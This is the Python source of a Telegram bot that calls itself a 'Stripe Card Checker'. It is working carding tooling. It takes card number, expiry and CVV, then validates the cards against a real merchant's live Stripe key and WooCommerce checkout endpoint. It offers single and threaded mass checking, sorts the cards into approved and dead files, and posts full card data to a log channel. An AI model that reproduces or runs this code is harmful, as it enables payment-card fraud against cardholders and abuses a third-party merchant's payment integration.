import requests
import re
from bs4 import BeautifulSoup
from urllib.parse import urlencode
import json
import os
import time
import logging
import threading
import asyncio
import signal
import sys
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import concurrent.futures
from datetime import datetime

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('bot.log')
    ]
)
logger = logging.getLogger(__name__)

# Get bot token and log channel from environment variables
BOT_TOKEN = os.getenv('BOT_TOKEN')
LOG_CHANNEL_ID = os.getenv('LOG_CHANNEL_ID')  # Add this to your environment variables

if not BOT_TOKEN:
    logger.error("BOT_TOKEN environment variable not set!")
    sys.exit(1)

if not LOG_CHANNEL_ID:
    logger.warning("LOG_CHANNEL_ID not set. Logging to channel disabled.")

# Global application instance for graceful shutdown
app = None
file_lock = threading.Lock()

# Log channel functionality
async def log_to_channel(message: str, bot: Bot = None):
    """Send log message to the designated log channel"""
    if not LOG_CHANNEL_ID or not bot:
        return
    
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        formatted_message = f"ðŸ• {timestamp}\n{message}"
        
        await bot.send_message(
            chat_id=LOG_CHANNEL_ID,
            text=formatted_message,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Failed to send log to channel: {e}")

async def log_user_interaction(update: Update, action: str, details: str = ""):
    """Log user interactions to the channel"""
    if not LOG_CHANNEL_ID:
        return
    
    user = update.effective_user
    chat = update.effective_chat
    
    log_message = f"""
ðŸ“Š **USER INTERACTION LOG**

ðŸ‘¤ **User:** {user.full_name} (@{user.username or 'No username'})
ðŸ†” **User ID:** `{user.id}`
ðŸ’¬ **Chat:** {chat.title or 'Private Chat'} (`{chat.id}`)
ðŸŽ¯ **Action:** {action}
ðŸ“ **Details:** {details}
    """
    
    try:
        bot = update.get_bot()
        await log_to_channel(log_message, bot)
    except Exception as e:
        logger.error(f"Failed to log user interaction: {e}")

async def log_card_processing(card_data: str, result: dict, user_info: dict, bot: Bot):
    """Log card processing results to the channel"""
    if not LOG_CHANNEL_ID:
        return
    
    status_emoji = {
        'APPROVED': 'âœ…',
        'DECLINED': 'âŒ',
        'ERROR': 'âš ï¸',
        'UNKNOWN': 'â“'
    }
    
    emoji = status_emoji.get(result['status'], 'â“')
    
    log_message = f"""
ðŸ’³ **CARD PROCESSING LOG**

ðŸ‘¤ **User:** {user_info.get('name', 'Unknown')} (@{user_info.get('username', 'No username')})
ðŸ†” **User ID:** `{user_info.get('id', 'Unknown')}`
ðŸ’³ **Card:** `{card_data}`
{emoji} **Result:** {result['status']}
ðŸ“ **Message:** {result.get('message', 'No message')}
â±ï¸ **Processing Time:** {result.get('time', 'Unknown')}s
    """
    
    await log_to_channel(log_message, bot)

async def log_system_event(event_type: str, details: str, bot: Bot = None):
    """Log system events to the channel"""
    if not LOG_CHANNEL_ID:
        return
    
    log_message = f"""
ðŸ”§ **SYSTEM EVENT LOG**

ðŸ“‹ **Event Type:** {event_type}
ðŸ“ **Details:** {details}
    """
    
    if bot:
        await log_to_channel(log_message, bot)

def extract_nonce(response_text, url):
    soup = BeautifulSoup(response_text, 'html.parser')
    checkout_nonce = soup.find('input', {'name': 'woocommerce-process-checkout-nonce'})
    if checkout_nonce:
        return checkout_nonce['value']

    stripe_nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', response_text)
    if stripe_nonce_match:
        return stripe_nonce_match.group(1)

    script_nonce_match = re.search(r'"nonce":"([^"]+)"', response_text)
    if script_nonce_match:
        return script_nonce_match.group(1)

    raise ValueError(f"Could not find any nonce on {url}")

def create_payment_method(cc, m, y, cvv):
    url = "https://api.stripe.com/v1/payment_methods"
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-IN',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_year]': y,
        'card[exp_month]': m,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'IN',
        'payment_user_agent': 'stripe.js/2b425ea933; stripe-js-v3/2b425ea933; payment-element; deferred-intent',
        'referrer': 'https://radio-tecs.com',
        'time_on_page': '57018',
        'client_attribution_metadata[client_session_id]': 'a05ac5c7-6aaa-4abd-9ac7-8b5ab40ebd1b',
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'guid': '205dda56-6eb9-46f4-8609-e3addd479f0c177bc7',
        'muid': 'ebfc2dae-07ec-48dc-a474-5de8f917b8aa7b2f88',
        'sid': 'd158565f-7ea3-46e9-8587-cef28ce35fab191ba2',
        'key': 'pk_live_51JRJFgJNjZL6EJkQHeYkzBEpfeXNg9qADJwvdvXWpA3a2Dzl6TXIQwOLC3dyb56lGKSPNm8a0nTL8PlqFrHejIop00DUXcrpCK',
        '_stripe_version': '2024-06-20',
    }

    try:
        response = requests.post(url, headers=headers, data=data, timeout=30)
        if response.status_code == 200:
            return response.json().get('id')
        else:
            return None
    except Exception as e:
        logger.error(f"Payment method creation error: {e}")
        return None

def create_setup_intent(payment_method_id, cc):
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    })

    checkout_url = "https://radio-tecs.com/checkout/"
    try:
        response = session.get(checkout_url, timeout=30)
        response.raise_for_status()
        nonce = extract_nonce(response.text, checkout_url)
    except Exception as e:
        logger.error(f"Checkout page error: {e}")
        return None

    url = "https://radio-tecs.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
    data = {
        "action": "create_and_confirm_setup_intent",
        "wc-stripe-payment-method": payment_method_id,
        "wc-stripe-payment-type": "card",
        "_ajax_nonce": nonce,
    }

    try:
        response = session.post(
            url,
            data=urlencode(data),
            headers={"Referer": checkout_url},
            timeout=30
        )

        if response.status_code == 200:
            try:
                return response.json()
            except ValueError:
                return None
        else:
            return None

    except requests.exceptions.RequestException as e:
        logger.error(f"Setup intent error: {e}")
        return None

def process_cc(ccc):
    start_time = time.time()
    try:
        cc, m, y, cvv = ccc.split("|")
        y = y.replace("20", "") if y.startswith("20") else y

        payment_method_id = create_payment_method(cc, m, y, cvv)
        if not payment_method_id:
            timer = round(time.time() - start_time, 1)
            return {
                'status': 'DECLINED',
                'message': f"ðŸ’³ {cc}|{m}|{y}|{cvv}\nâŒ **DECLINED** - Payment method creation failed\nâ±ï¸ Time: {timer}s",
                'card': ccc,
                'time': timer
            }

        result = create_setup_intent(payment_method_id, cc)
        timer = round(time.time() - start_time, 1)

        if result is None:
            status = 'ERROR'
            emoji = 'âš ï¸'
            message = 'Setup intent failed'
            filename = 'error.txt'
        elif result.get("success"):
            status = 'APPROVED'
            emoji = 'âœ…'
            message = 'Approved'
            filename = 'approved.txt'
        elif "data" in result and "error" in result["data"]:
            status = 'DECLINED'
            emoji = 'âŒ'
            message = result['data']['error']['message']
            filename = 'dead.txt'
        else:
            status = 'UNKNOWN'
            emoji = 'â“'
            message = 'Unknown response'
            filename = 'unknown.txt'

        try:
            with file_lock:
                with open(filename, "a") as f:
                    f.write(f"{cc}|{m}|{y}|{cvv} - {message}\n")
        except Exception as e:
            logger.error(f"File write error: {e}")

        return {
            'status': status,
            'message': f"ðŸ’³ {cc}|{m}|{y}|{cvv}\n{emoji} **{status}** - {message}\nâ±ï¸ Time: {timer}s",
            'card': ccc,
            'time': timer
        }

    except Exception as e:
        timer = round(time.time() - start_time, 1)
        logger.error(f"Card processing error: {e}")
        return {
            'status': 'ERROR',
            'message': f"ðŸ’³ {ccc}\nâš ï¸ **ERROR** - Processing error\nâ±ï¸ Time: {timer}s",
            'card': ccc,
            'time': timer
        }

def process_card_thread(card_data):
    return process_cc(card_data.strip())

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Log user interaction
    await log_user_interaction(update, "START_COMMAND", "User started the bot")
    
    welcome_message = """
ðŸ¤– **Stripe Card Checker Bot**

Commands:
/start - Show this help message
/chk <card> - Check a single card
/mass <cards> - Check multiple cards using threading
/stats - Show processing statistics

Send me a card in the format: 1234567890123456|12|25|123
    """
    await update.message.reply_text(welcome_message, parse_mode='Markdown')

async def check_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await log_user_interaction(update, "CHK_COMMAND_ERROR", "No card provided")
        await update.message.reply_text("âŒ Please provide a card in format: /chk 1234567890123456|12|25|123")
        return

    card_data = " ".join(context.args)
    dados = card_data.split("|")

    if len(dados) != 4:
        await log_user_interaction(update, "CHK_COMMAND_ERROR", f"Invalid format: {card_data}")
        await update.message.reply_text("âŒ Invalid format. Use: 1234567890123456|12|25|123")
        return

    await log_user_interaction(update, "CHK_COMMAND", f"Checking single card: {card_data}")
    
    processing_msg = await update.message.reply_text("ðŸ”„ Processing card...")

    result = process_cc(card_data)
    
    # Log card processing result
    user_info = {
        'name': update.effective_user.full_name,
        'username': update.effective_user.username,
        'id': update.effective_user.id
    }
    await log_card_processing(card_data, result, user_info, update.get_bot())

    await update.message.reply_text(result['message'], parse_mode='Markdown')

    try:
        await processing_msg.delete()
    except Exception as e:
        logger.error(f"Failed to delete processing message: {e}")

async def mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message_text = update.message.text

    if message_text.startswith('/mass'):
        cards_text = message_text[5:].strip()
    else:
        await update.message.reply_text("âŒ Invalid mass command format.")
        return

    if not cards_text:
        await update.message.reply_text("âŒ Please provide cards after /mass command.")
        return

    card_lines = [line.strip() for line in cards_text.split('\n') if line.strip()]

    if not card_lines:
        await update.message.reply_text("âŒ No valid card data found.")
        return

    await log_user_interaction(update, "MASS_COMMAND", f"Processing {len(card_lines)} cards")
    
    processing_msg = await update.message.reply_text(f"ðŸš€ Processing {len(card_lines)} cards with threading...")

    start_time = time.time()

    max_workers = min(len(card_lines), 5)
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_card = {
            executor.submit(process_card_thread, card): card 
            for card in card_lines
        }

        results = []
        user_info = {
            'name': update.effective_user.full_name,
            'username': update.effective_user.username,
            'id': update.effective_user.id
        }
        
        for future in concurrent.futures.as_completed(future_to_card):
            card = future_to_card[future]
            try:
                result = future.result()
                results.append(result)
                # Log each card processing result
                await log_card_processing(card, result, user_info, update.get_bot())
            except Exception as exc:
                logger.error(f'Card {card} generated an exception: {exc}')
                error_result = {
                    'status': 'ERROR',
                    'message': f"âŒ Error processing: {card.strip()}",
                    'card': card.strip(),
                    'time': 0
                }
                results.append(error_result)
                await log_card_processing(card, error_result, user_info, update.get_bot())

    try:
        await processing_msg.delete()
    except Exception as e:
        logger.error(f"Failed to delete processing message: {e}")

    total_time = round(time.time() - start_time, 1)

    approved = declined = errors = unknown = invalid = 0

    for result in results:
        await update.message.reply_text(result['message'], parse_mode='Markdown')

        if result['status'] == 'APPROVED':
            approved += 1
        elif result['status'] == 'DECLINED':
            declined += 1
        elif result['status'] == 'ERROR':
            errors += 1
        elif result['status'] == 'INVALID':
            invalid += 1
        else:
            unknown += 1

    summary = f"""
âš¡ **Mass Check Complete**

âœ… Approved: {approved}
âŒ Declined: {declined}
âš ï¸ Errors: {errors}
â“ Unknown: {unknown}
ðŸš« Invalid: {invalid}

Total processed: {len(card_lines)}
â±ï¸ Total time: {total_time}s
ðŸš€ Threading used: {max_workers} workers
    """
    await update.message.reply_text(summary, parse_mode='Markdown')
    
    # Log mass check completion
    await log_system_event(
        "MASS_CHECK_COMPLETE", 
        f"User {update.effective_user.full_name} completed mass check: {approved} approved, {declined} declined, {errors} errors",
        update.get_bot()
    )

async def bulk_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await log_user_interaction(update, "BULK_COMMAND", "Started bulk processing from db.txt")
    
    caminho = os.path.join(os.path.dirname(__file__), "db.txt")

    if not os.path.exists(caminho):
        await update.message.reply_text("âŒ File 'db.txt' not found.")
        return

    try:
        with open(caminho, "r") as file:
            linhas = file.readlines()
    except Exception as e:
        await update.message.reply_text(f"âŒ Error reading db.txt: {e}")
        return

    if not linhas:
        await update.message.reply_text("âŒ db.txt is empty.")
        return

    processing_msg = await update.message.reply_text(f"ðŸ”„ Processing {len(linhas)} cards...")

    approved = declined = errors = unknown = 0
    user_info = {
        'name': update.effective_user.full_name,
        'username': update.effective_user.username,
        'id': update.effective_user.id
    }

    for linha in linhas[:]:
        if not linha.strip():
            continue

        dados = linha.strip().split("|")
        if len(dados) != 4:
            await update.message.reply_text(f"âŒ Invalid format: {linha.strip()}")
            continue

        result = process_cc(linha.strip())
        
        # Log card processing result
        await log_card_processing(linha.strip(), result, user_info, update.get_bot())

        if result['status'] == 'APPROVED':
            approved += 1
        elif result['status'] == 'DECLINED':
            declined += 1
        elif result['status'] == 'ERROR':
            errors += 1
        else:
            unknown += 1

        await update.message.reply_text(result['message'], parse_mode='Markdown')

        linhas.remove(linha)
        try:
            with open(caminho, "w") as f:
                f.writelines(linhas)
        except Exception as e:
            logger.error(f"Error updating db.txt: {e}")

        await asyncio.sleep(2)

    try:
        await processing_msg.delete()
    except Exception as e:
        logger.error(f"Failed to delete processing message: {e}")

    summary = f"""
ðŸ“Š **Processing Complete**

âœ… Approved: {approved}
âŒ Declined: {declined}
âš ï¸ Errors: {errors}
â“ Unknown: {unknown}

Total processed: {approved + declined + errors + unknown}
    """
    await update.message.reply_text(summary, parse_mode='Markdown')
    
    # Log bulk check completion
    await log_system_event(
        "BULK_CHECK_COMPLETE", 
        f"User {update.effective_user.full_name} completed bulk check: {approved} approved, {declined} declined, {errors} errors",
        update.get_bot()
    )

async def handle_card_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    dados = text.split("|")

    if len(dados) == 4:
        await log_user_interaction(update, "DIRECT_CARD_INPUT", f"Processing card: {text}")
        
        processing_msg = await update.message.reply_text("ðŸ”„ Processing card...")

        result = process_cc(text)
        
        # Log card processing result
        user_info = {
            'name': update.effective_user.full_name,
            'username': update.effective_user.username,
            'id': update.effective_user.id
        }
        await log_card_processing(text, result, user_info, update.get_bot())

        await update.message.reply_text(result['message'], parse_mode='Markdown')

        try:
            await processing_msg.delete()
        except Exception as e:
            logger.error(f"Failed to delete processing message: {e}")
    else:
        await log_user_interaction(update, "INVALID_CARD_FORMAT", f"Invalid format: {text}")
        await update.message.reply_text("âŒ Invalid format. Use: 1234567890123456|12|25|123")

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await log_user_interaction(update, "STATS_COMMAND", "Requested statistics")
    
    files = ['approved.txt', 'dead.txt', 'error.txt', 'unknown.txt']
    stats_text = "ðŸ“Š **Statistics**\n\n"

    for filename in files:
        try:
            if os.path.exists(filename):
                with open(filename, 'r') as f:
                    count = len(f.readlines())
                stats_text += f"{filename}: {count} cards\n"
            else:
                stats_text += f"{filename}: 0 cards\n"
        except Exception as e:
            logger.error(f"Error reading {filename}: {e}")
            stats_text += f"{filename}: Error reading file\n"

    await update.message.reply_text(stats_text, parse_mode='Markdown')

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error(f"Exception while handling an update: {context.error}")
    
    # Log error to channel if possible
    if hasattr(context, 'bot') and context.bot:
        await log_system_event(
            "BOT_ERROR", 
            f"Error occurred: {context.error}",
            context.bot
        )

def signal_handler(signum, frame):
    logger.info(f"Received signal {signum}. Shutting down gracefully...")
    if app:
        try:
            loop = asyncio.get_event_loop()
            if not loop.is_closed():
                loop.create_task(app.stop())
                loop.create_task(app.shutdown())
        except Exception as e:
            logger.error(f"Error during shutdown: {e}")
    sys.exit(0)

def main():
    global app

    logger.info("Starting Stripe Card Checker Bot...")

    # Set up signal handlers for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    try:
        # Create the Application
        app = Application.builder().token(BOT_TOKEN).build()

        # Add command handlers
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("chk", check_single_card))
        app.add_handler(CommandHandler("mass", mass_check))
        #app.add_handler(CommandHandler("bulk", bulk_check))
        app.add_handler(CommandHandler("stats", stats))

        # Add message handler for direct card input
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_card_message))

        # Add error handler
        app.add_error_handler(error_handler)

        # Log bot startup
        if LOG_CHANNEL_ID:
            async def startup_log():
                await log_system_event("BOT_STARTUP", "Stripe Card Checker Bot started successfully", app.bot)
            
            # Schedule startup log
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(startup_log())

        # Start the bot with polling
        logger.info("Bot started with polling...")

        # Check if there's already a running event loop
        try:
            loop = asyncio.get_running_loop()
            # If we get here, there's already a running loop
            # Create a task in the existing loop
            loop.create_task(app.run_polling(
                allowed_updates=Update.ALL_TYPES,
                drop_pending_updates=True,
                close_loop=False
            ))
            # Keep the main thread alive
            while True:
                time.sleep(1)
        except RuntimeError:
            # No running loop, we can use asyncio.run()
            asyncio.run(app.run_polling(
                allowed_updates=Update.ALL_TYPES,
                drop_pending_updates=True,
                close_loop=False
            ))

    except Exception as e:
        logger.error(f"Error starting bot: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
